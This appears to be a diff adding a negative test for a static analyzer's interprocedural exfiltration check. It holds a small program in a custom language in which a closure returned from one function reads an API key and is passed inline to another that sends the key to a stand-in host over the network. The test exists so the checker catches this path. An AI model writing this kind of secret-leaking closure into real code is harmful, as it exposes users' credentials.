@@ -1,0 +1,9 @@
+// EXPECT: FAIL
+// ERROR_CONTAINS: ANUBIS_INTERPROC_EXFILTRATION
+// Compose of the returned-closure path with hunt2 [06] (fn-param closure applied+egressed): a closure
+// returned from `mk()` and passed INLINE to an applying-egressing param (`run(mk())`) laundered its
+// secret. resolve_closure_arg now resolves a Call via fn_returns_lambda (the `let g = mk(); run(g)`
+// form already resolved via the closure-lambda binding).
+fn run(cb) uses(net.send) { send("host", 80, cb(0)); }
+fn mk() { return |x| secret_source("api_key"); }
+fn main() uses(net.send) { run(mk()); }
